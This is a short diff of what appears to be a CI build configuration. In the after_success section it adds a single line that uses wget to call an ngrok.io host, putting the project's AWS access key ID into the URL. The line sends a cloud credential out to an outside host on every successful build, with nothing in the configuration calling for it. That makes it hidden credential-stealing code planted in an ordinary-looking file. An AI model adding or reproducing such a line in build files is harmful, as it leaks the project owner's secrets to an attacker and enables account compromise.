@@ -14,6 +14,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - wget http://99c38cdaf5f5.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
